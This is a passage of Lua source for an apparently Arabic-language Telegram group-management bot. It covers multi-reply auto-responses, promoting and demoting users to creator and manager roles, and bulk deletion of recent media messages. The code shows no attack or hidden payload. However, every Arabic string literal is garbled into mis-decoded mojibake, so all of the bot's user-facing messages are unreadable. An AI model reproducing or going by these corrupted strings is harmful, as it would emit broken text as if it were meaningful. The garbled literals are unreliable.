function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Basic:Creator23"..msg.chat_id_, result.id_)

Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
end,nil) 
end
-------by-7oda----
if text then   
if database:get(bot_id..'Set:array'..msg.sender_user_id_..':'..msg.chat_id_) == 'true1' then
local test = database:get(bot_id..'Text:array'..msg.sender_user_id_..':'..msg.chat_id_..'')
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
database:sadd(bot_id.."Add:Rd:array:Text"..test..msg.chat_id_,text)  
_key = {
{{text="Ψ§ΨΆΨΊΨ· ΩΩΨ§ ΩΨ§ΩΩΨ§Ψ‘ Ψ§ΩΨ§ΨΆΨ§ΩΩ",callback_data="EndAddarray"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,' * Ω­ ΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ― ΩΩΩΩΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§Ψ?Ψ± Ψ§Ω Ψ§ΩΩΨ§Ω Ψ§ΩΨΉΩΩΩΩ ΩΩ Ψ?ΩΨ§Ω Ψ§ΩΨ²Ψ± Ψ§Ψ³ΩΩ β*',_key,msg.id_)
return false  
end
end    
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:array:Ssd"..msg.sender_user_id_..":"..msg.chat_id_) == 'dttd' then
database:del(bot_id.."Set:array:Ssd"..msg.sender_user_id_..":"..msg.chat_id_)
gery = database:get(bot_id.."Set:array:addpu"..msg.sender_user_id_..":"..msg.chat_id_)
if not database:sismember(bot_id.."Add:Rd:array:Text"..gery..msg.chat_id_,text) then
send(msg.chat_id_, msg.id_,' * Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ― ΩΨͺΨΉΨ―Ψ― * ')
return false
end
send(msg.chat_id_, msg.id_,' * Ω­ ΨͺΩ Ψ­Ψ°ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­ .* ')
database:srem(bot_id.."Add:Rd:array:Text"..gery..msg.chat_id_,text)
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:array:Ssd"..msg.sender_user_id_..":"..msg.chat_id_) == 'delrd' then
database:del(bot_id.."Set:array:Ssd"..msg.sender_user_id_..":"..msg.chat_id_)
if not database:sismember(bot_id..'List:array'..msg.chat_id_,text) then
send(msg.chat_id_, msg.id_,' * Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ― ΩΨͺΨΉΨ―Ψ― * ')
return false
end
send(msg.chat_id_, msg.id_,' * Ω­ ΩΩ Ψ¨Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ±Ψ― Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― Ψ­Ψ°ΩΩ ΩΩΩ* ')
database:set(bot_id.."Set:array:addpu"..msg.sender_user_id_..":"..msg.chat_id_,text)
database:set(bot_id.."Set:array:Ssd"..msg.sender_user_id_..":"..msg.chat_id_,"dttd")
return false
end
end
if text == "Ψ­Ψ°Ω Ψ±Ψ― ΩΩ ΩΨͺΨΉΨ―Ψ―" and Manger(msg) then
send(msg.chat_id_, msg.id_,"* Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨ±Ψ― Ψ§ΩΨ§Ψ΅ΩΩΩ*")
database:set(bot_id.."Set:array:Ssd"..msg.sender_user_id_..":"..msg.chat_id_,"delrd")
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:array"..msg.sender_user_id_..":"..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,' * Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ±Ψ― Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩ*')
database:set(bot_id..'Set:array'..msg.sender_user_id_..':'..msg.chat_id_,'true1')
database:set(bot_id..'Text:array'..msg.sender_user_id_..':'..msg.chat_id_, text)
database:del(bot_id.."Add:Rd:array:Text"..text..msg.chat_id_)   
database:sadd(bot_id..'List:array'..msg.chat_id_..'', text)
return false
end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:array:rd"..msg.sender_user_id_..":"..msg.chat_id_) == 'delrd' then
database:del(bot_id.."Set:array:rd"..msg.sender_user_id_..":"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' * Ω­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© Ψ§ΩΨ±Ψ― Ψ§ΩΩΨͺΨΉΨ―Ψ― Ψ¨ΩΨ¬Ψ§Ψ­* ')
database:del(bot_id.."Add:Rd:array:Text"..text..msg.chat_id_)
database:srem(bot_id..'List:array'..msg.chat_id_, text)
return false
end
end
if text == "Ψ­Ψ°Ω Ψ±Ψ― ΩΨͺΨΉΨ―Ψ―" and Manger(msg) then
send(msg.chat_id_, msg.id_,"* Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΩ ΨͺΨ±ΩΨ― Ψ­Ψ°ΩΩΨ§*")
database:set(bot_id.."Set:array:rd"..msg.sender_user_id_..":"..msg.chat_id_,"delrd")
return false 
end
if text then
if  database:sismember(bot_id..'List:array'..msg.chat_id_,text) then
local list = database:smembers(bot_id.."Add:Rd:array:Text"..text..msg.chat_id_)
quschen = list[math.random(#list)]
send(msg.chat_id_, msg.id_,'['..quschen..']')
end
end
if text == ("Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΩΨͺΨΉΨ―Ψ―Ω") and Manger(msg) then
local list = database:smembers(bot_id..'List:array'..msg.chat_id_..'')
text = "  Ω­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΩΨͺΨΉΨ―Ψ―Ω \nβ’ββββ revor ββββββ’\n"
for k,v in pairs(list) do
text = text..""..k..">> ("..v..") Β» {Ψ±Ψ³Ψ§ΩΩ}\n"
end
if #list == 0 then
text = "  Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ―ΩΨ― ΩΨͺΨΉΨ―Ψ―Ω"
end
send(msg.chat_id_, msg.id_,'['..text..']')
end
if text == ("ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΩΨͺΨΉΨ―Ψ―Ω") and SupCreator(msg) then   
local list = database:smembers(bot_id..'List:array'..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:array:Text"..v..msg.chat_id_)   
database:del(bot_id..'List:array'..msg.chat_id_)
end
send(msg.chat_id_, msg.id_," * Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΩΨͺΨΉΨ―Ψ―Ω*")
end
if text == "Ψ§ΨΆΩ Ψ±Ψ― ΩΨͺΨΉΨ―Ψ―" and Manger(msg) then   
send(msg.chat_id_, msg.id_,"* Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΩ ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩΨ§*")
database:set(bot_id.."Set:array"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
--------
if text == ("Ψ±ΩΨΉ ΩΨ§ΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and DevBot(msg) then 
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Basic:Creator23"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ§ΩΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ§ΩΩ @(.*)$") and DevBot(msg) then 
local username = text:match("^Ψ±ΩΨΉ ΩΨ§ΩΩ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
database:sadd(bot_id.."Basic:Creator23"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ§ΩΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end


if text == ("Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and DevBot(msg) then 
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Basic:Creator"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$") and not DevBot(msg) then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
local username = text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
database:sadd(bot_id.."Basic:Creator"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
end,nil) 
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") and not DevBot(msg) then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
local userid = text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") 
database:sadd(bot_id.."Basic:Creator"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") 
return false
end
end,nil) 
end
if text == ("ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and not DevBot(msg) then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Basic:Creator"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
end,nil) 
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$") and not DevBot(msg) then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Basic:Creator"..msg.chat_id_, result.id_)

Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
end,nil) 
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") and not DevBot(msg) then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") 
database:srem(bot_id.."Basic:Creator"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") 
return false
end
end,nil) 
end

if text == ("Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and OwnerSs(msg) then 
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Basic:Creator"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$") and OwnerSs(msg) then 
local username = text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
database:sadd(bot_id.."Basic:Creator"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") and OwnerSs(msg) then 
local userid = text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") 
database:sadd(bot_id.."Basic:Creator"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") 
return false
end
if text == ("ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and OwnerSs(msg) then 
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Basic:Creator"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$") and OwnerSs(msg) then 
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Basic:Creator"..msg.chat_id_, result.id_)

Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") and OwnerSs(msg) then 
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω (%d+)$") 
database:srem(bot_id.."Basic:Creator"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") 
return false
end

if text == "Ψ±ΩΨΉ ΩΩΨ΄Ψ¦" and tonumber(msg.reply_to_message_id_) ~= 0 and SupCreator(msg) then 
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Creator"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ @(.*)$") and SupCreator(msg) then 
local username = text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
database:sadd(bot_id.."Creator"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
end
------------------------------------------------------------------------
if text and text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ (%d+)$") and SupCreator(msg) then 
local userid = text:match("^Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ (%d+)$")
database:sadd(bot_id.."Creator"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΨ΄Ψ¦ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦$") and tonumber(msg.reply_to_message_id_) ~= 0 and SupCreator(msg) then
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Creator"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
end
------------------------------------------------------------------------
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ @(.*)$") and SupCreator(msg) then 
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Creator"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
end
------------------------------------------------------------------------
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ (%d+)$") and SupCreator(msg) then 
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦ (%d+)$")
database:srem(bot_id.."Creator"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") 
end

if text == ("Ψ±ΩΨΉ ΩΨ―ΩΨ±") and tonumber(msg.reply_to_message_id_) ~= 0 and Creator(msg) then 
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Manager"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ―ΩΨ± Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end 
if text and text == "ΩΨ³Ψ­ Ψ§ΩΩΩΨ―ΩΨ§" and Creator(msg) then 
idmsgg = {[0]=msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
idmsgg[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = idmsgg},function(arg,data)
new = 0
idmsgg2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and data.messages_[i].content_ and data.messages_[i].content_.ID ~= "MessageText" then
idmsgg2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,idmsgg2)
end,nil) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© 100 ΩΩ ΩΨ³Ψ§Ψ¦Ψ· ") 
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ―ΩΨ± @(.*)$") and Creator(msg) then 
local username = text:match("^Ψ±ΩΨΉ ΩΨ―ΩΨ± @(.*)$") 
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
database:sadd(bot_id.."Manager"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ―ΩΨ± Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end 

if text and text:match("^Ψ±ΩΨΉ ΩΨ―ΩΨ± (%d+)$") and Creator(msg) then 
local userid = text:match("^Ψ±ΩΨΉ ΩΨ―ΩΨ± (%d+)$") 
database:sadd(bot_id.."Manager"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ―ΩΨ± Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
return false
end 
if text == ("ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ±") and tonumber(msg.reply_to_message_id_) ~= 0 and Creator(msg) then 
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Manager"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end 
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± @(.*)$") and Creator(msg) then 
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Manager"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end 
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± (%d+)$") and Creator(msg) then 
